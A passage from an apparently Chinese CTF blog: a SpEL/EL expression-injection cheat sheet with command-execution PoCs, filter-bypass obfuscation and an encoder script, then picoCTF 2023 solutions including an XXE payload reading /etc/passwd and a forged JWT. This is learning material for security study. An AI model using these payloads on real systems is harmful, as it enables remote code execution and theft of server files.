class="hljs-constructor">Value()</span><br></code></pre></td></tr></table></figure><h4 id="常见poc与绕过"><a class="markdownIt-Anchor" href="#常见poc与绕过"></a> 常见POC与绕过</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// PoC原型</span><br>#Runtime<br><span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-constructor">T(Runtime)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br>#ProcessBuilder<br><span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(&#123;&#x27;<span class="hljs-params">calc</span>&#x27;&#125;)</span>.start<span class="hljs-literal">()</span><br><span class="hljs-keyword">new</span> <span class="hljs-constructor">ProcessBuilder(&#123;&#x27;<span class="hljs-params">calc</span>&#x27;&#125;)</span>.start<span class="hljs-literal">()</span><br><br><span class="hljs-comment">// Bypass技巧</span><br><br>#反射调用<br><span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br>#同上，需要有上下文环境<br>#this.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><br># 反射调用+字符串拼接，绕过如javacon题目中的正则过滤<br><span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>),<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br># 同上，需要有上下文环境<br>#this.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>),<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br># 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1<br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br><span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.String(<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[]&#123;99,97,108,99&#125;)</span>).start<span class="hljs-literal">()</span><br><br># 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2<br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br><span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime)</span>.get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(99)</span>.concat(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(97)</span>).concat(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(108)</span>).concat(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Character)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(99)</span>))<br><br># JavaScript引擎通用PoC<br><span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>)</span>.eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)<br><br><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.StreamUtils)</span>.copy(<span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>)</span>.eval(<span class="hljs-string">&quot;xxx&quot;</span>),)<br><br># JavaScript引擎+反射调用<br><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.StreamUtils)</span>.copy(<span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>)</span>.eval(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])</span>).invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>.invoke(<span class="hljs-constructor">T(String)</span>.get<span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)</span>),<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)),)<br><br># JavaScript引擎+URL编码<br><span class="hljs-comment">// 其中URL编码内容为：</span><br><span class="hljs-comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">util</span>.StreamUtils)</span>.copy(<span class="hljs-constructor">T(<span class="hljs-params">javax</span>.<span class="hljs-params">script</span>.ScriptEngineManager)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.get<span class="hljs-constructor">EngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>)</span>.eval(<span class="hljs-constructor">T(<span class="hljs-params">java</span>.<span class="hljs-params">net</span>.URLDecoder)</span>.decode(<span class="hljs-string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)<br><br># 黑名单过滤<span class="hljs-string">&quot;.getClass(&quot;</span>，可利用数组的方式绕过，还未测试成功<br>&#x27;<span class="hljs-character">&#x27;[&#x27;</span><span class="hljs-keyword">class</span>&#x27;].<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime&#x27;)</span>.get<span class="hljs-constructor">DeclaredMethods()</span><span class="hljs-literal">[<span class="hljs-number">15</span>]</span>.invoke(&#x27;<span class="hljs-character">&#x27;[&#x27;</span><span class="hljs-keyword">class</span>&#x27;].<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime&#x27;)</span>.get<span class="hljs-constructor">DeclaredMethods()</span><span class="hljs-literal">[<span class="hljs-number">7</span>]</span>.invoke(null),&#x27;calc&#x27;)<br><br># JDK9新增的shell，还未测试<br><span class="hljs-constructor">T(SomeWhitelistedClassNotPartOfJDK)</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;jdk.jshell.JShell&quot;</span>,<span class="hljs-params">true</span>)</span>.Methods<span class="hljs-literal">[<span class="hljs-number">6</span>]</span>.invoke(null,&#123;&#125;).eval(&#x27;whatever java code <span class="hljs-keyword">in</span> one statement&#x27;).<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><br>#java.nio读文件<br>&#x27;&#x27;.<span class="hljs-keyword">class</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">nio</span>.<span class="hljs-params">charset</span>.StandartCharsets&#x27;)</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UTF_8</span>.</span></span>decode(&#x27;&#x27;.<span class="hljs-keyword">class</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">nio</span>.ByteBuffer&#x27;)</span>.wrap(&#x27;&#x27;.<span class="hljs-keyword">class</span>.forname(&#x27;java.nio.file.Files&#x27;),read<span class="hljs-constructor">AllBytes(&#x27;&#x27;.<span class="hljs-params">class</span>.<span class="hljs-params">forName</span>(&#x27;<span class="hljs-params">java</span>.<span class="hljs-params">nio</span>.<span class="hljs-params">file</span>.Paths&#x27;)</span>.get(&#x27;/flag&#x27;))))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter message to encode:&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decoded string (in ASCII):\n&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;T(java.lang.Character).toString(%s)&#x27;</span> % <span class="hljs-built_in">ord</span>(message[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> message[<span class="hljs-number">1</span>:]:<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="hljs-built_in">ord</span>(ch), end=<span class="hljs-string">&quot;&quot;</span>), <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;new java.lang.String(new byte[]&#123;&#x27;</span>, end=<span class="hljs-string">&quot;&quot;</span>),<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">ord</span>(message[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> message[<span class="hljs-number">1</span>:]:<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;,%s&#x27;</span> % <span class="hljs-built_in">ord</span>(ch), end=<span class="hljs-string">&quot;&quot;</span>), <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;)&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;pageContext&#125; 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）<br><br>$&#123;pageContext<span class="hljs-selector-class">.getSession</span>()<span class="hljs-selector-class">.getServletContext</span>()<span class="hljs-selector-class">.getClassLoader</span>()<span class="hljs-selector-class">.getResource</span>(<span class="hljs-string">&quot;&quot;</span>)&#125;   获取web路径<br><br>$&#123;header&#125;  文件头参数<br><br>$&#123;applicationScope&#125; 获取webRoot<br><br>$&#123;pageContext<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.getSession</span>()<span class="hljs-selector-class">.setAttribute</span>(<span class="hljs-string">&quot;a&quot;</span>,pageContext<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<span class="hljs-selector-class">.getMethod</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>,null)<span class="hljs-selector-class">.invoke</span>(null,null)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;命令&quot;</span>)<span class="hljs-selector-class">.getInputStream</span>())&#125;  执行命令<br><br><br><span class="hljs-comment">// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。</span><br><br>&lt;<span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">th</span>:text=<span class="hljs-string">&quot;$&#123;#this.getClass().forName(&#x27;java.lang.System&#x27;).getProperty(&#x27;user.dir&#x27;)&#125;&quot;</span>&gt;&lt;/p&gt;   <span class="hljs-comment">//获取web路径</span><br></code></pre></td></tr></table></figure><h5 id="过滤t"><a class="markdownIt-Anchor" href="#过滤t"></a> 过滤<code>T(</code></h5><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">&#x27;<span class="hljs-symbol">&#x27;.class.forname</span>(<span class="hljs-symbol">&#x27;java.lang.Runtime</span>&#x27;)<br></code></pre></td></tr></table></figure><h3 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h3><p>使用SimpleEvaluationContext替换StandardEvaluationContext</p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3><p><em><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL表达式注入漏洞总结/</a></em></p><p><a href="https://forum.butian.net/share/2483">https://forum.butian.net/share/2483</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>picoCTF2023</title>
    <link href="/2023/03/20/picoCTF2023/"/>
    <url>/2023/03/20/picoCTF2023/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00findme"><a class="markdownIt-Anchor" href="#0x00findme"></a> 0x00findme</h3><p>重定向页面有base64编码：cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzM5Mjg2Yzk3fQ==  （要两次才能凑齐）</p><p>解码后得到<code>picoCTF&#123;proxies_all_the_way_39286c97&#125;</code></p><img src="/2023/03/20/picoCTF2023/1.png" class=""><h3 id="0x01matchtheregex"><a class="markdownIt-Anchor" href="#0x01matchtheregex"></a> 0x01MatchTheRegex</h3><p>考一个正则匹配，查看页面源码可以看到匹配内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> val = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;name&quot;</span>).<span class="hljs-property">value</span>;<br><span class="hljs-comment">// ^p.....F!?</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/flag?input=<span class="hljs-subst">$&#123;val&#125;</span>`</span>)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br><span class="hljs-keyword">const</span> res_json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(res);<br><span class="hljs-title function_">alert</span>(res_json.<span class="hljs-property">flag</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输入<code>picoCTF</code>即可</p><img src="/2023/03/20/picoCTF2023/2.png" class=""><h3 id="0x02soap"><a class="markdownIt-Anchor" href="#0x02soap"></a> 0x02SOAP</h3><p>提示是XML外部实体注入,并且要读取/etc/passwd文件</p><p>抓包可以发现点击<code>Details</code>之后有xml</p><p>直接进行注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ID</span>&gt;</span><br>        <span class="hljs-symbol">&amp;xxe;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ID</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/3.png" class=""><h3 id="0x03more-sqli"><a class="markdownIt-Anchor" href="#0x03more-sqli"></a> 0x03More SQLi</h3><p>sql注入,常规试一下</p><img src="/2023/03/20/picoCTF2023/4.png" class=""><p>发现是password and username,所以注入点应该在password</p><img src="/2023/03/20/picoCTF2023/5.png" class=""><h3 id="0x04java-code-analysis"><a class="markdownIt-Anchor" href="#0x04java-code-analysis"></a> 0x04Java Code Analysis!?!</h3><p>把源码下载下来</p><p>提示要找到<code> the JWT Signing Key (&quot;secret key&quot;)</code></p><p>可以在源文件中找到<code>JwtService.java</code>,</p><p>有这样一段源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">JwtService</span><span class="hljs-params">(SecretGenerator secretGenerator)</span>&#123;<br>     <span class="hljs-built_in">this</span>.SECRET_KEY = secretGenerator.getServerSecret();<br> &#125;<br></code></pre></td></tr></table></figure><p><code>secret key</code> 是由<code>secretGenerator</code>产生，看到<code>SecretGenerator.java</code></p><p>密钥放在<code>server_secret.txt</code>里面，当没有这个文件时密钥为<code>1234</code></p><p>先抓一下包，发现JWT,<a href="https://jwt.io/">JWT解码</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Authorization:</span> Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTkxNDQ1MCwiaWF0IjoxNjc5MzA5NjUwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.Y5f4P9ivWsO5AqnXstKtUKyY02s8y8PL9L2msCAkhiI<br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/6.png" class=""><p>根据提示要修改 ‘role’ and ‘userId’，而且要使用密钥<code>1234</code></p><img src="/2023/03/20/picoCTF2023/7.png" class=""><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTkxNDQ1MCwiaWF0IjoxNjc5MzA5NjUwLCJ1c2VySWQiOjIsImVtYWlsIjoiYWRtaW4ifQ.g7dC751n3puM1TmnXbihfTGNED5EHyq6EmiQ9Gl4Dzs</code></p><p>接下来只要访问到flag对应的pdf就应该可以了</p><p>试了几次发现直接访问flag访问不到</p><p>第一个是user就能访问的，可以发现pdf所在路径为<code>/base/books/pdf/3</code></p><p>顺过去flag应该就是访问<code>/base/books/pdf/5</code></p><p>然后就出flag啦</p><img src="/2023/03/20/picoCTF2023/8.png" class=""><h3 id="0x05hidetosee"><a class="markdownIt-Anchor" href="#0x05hidetosee"></a> 0x05HideToSee</h3><img src="/2023/03/20/picoCTF2023/atbash.jpg" class=""><p>提示<code>ectract</code>，想到linux有一个工具<code>strghide</code></p><p><code>steghide extract -sf atbash.jpg</code></p><p>提取到<code>xqkwKBN&#123;z0bib1wv_l3kzgxb3l_k34ijli2&#125;</code></p><p>然后利用<a href="https://www.dcode.fr/atbash-cipher">在线网站</a>或者手动解密</p><p><code>picoCTF&#123;atbash_crack_1f84d779&#125;</code></p><h3 id="0x06readmycert"><a class="markdownIt-Anchor" href="#0x06readmycert"></a> 0x06ReadMyCert</h3><p>下载源件是一个证书</p><p>用openssl</p><p><code>openssl req -noout -text -in readmycert.csr</code></p><p>flag<code>picoCTF&#123;read_mycert_aac33761&#125;</code></p><h3 id="0x07rotation"><a class="markdownIt-Anchor" href="#0x07rotation"></a> 0x07rotation</h3><p>凯撒加密</p><img src="/2023/03/20/picoCTF2023/9.png" class=""><h3 id="0x08reverse"><a class="markdownIt-Anchor" href="#0x08reverse"></a> 0x08Reverse</h3><h3 id="0x09safe-opener-2"><a class="markdownIt-Anchor" href="#0x09safe-opener-2"></a> 0x09Safe Opener 2</h3><p>这两道ida打开直接可以看到flag</p><h3 id="0x0a-hideme"><a class="markdownIt-Anchor" href="#0x0a-hideme"></a> 0x0A hideme</h3><p>binwalk 一下发现有隐藏多个文件</p><p>foremost一下出flag</p><img src="/2023/03/20/picoCTF2023/10.png" class=""><h3 id="0x0bpcappoisoning"><a class="markdownIt-Anchor" href="#0x0bpcappoisoning"></a> 0x0BPcapPoisoning</h3><p>直接搜pico就看到了</p><img src="/2023/03/20/picoCTF2023/11.png" class=""><h3 id="0x0cwho-is-it"><a class="markdownIt-Anchor" href="#0x0cwho-is-it"></a> 0x0Cwho is it</h3><p>下载到一封邮件，直接看邮件头</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Delivered-To: 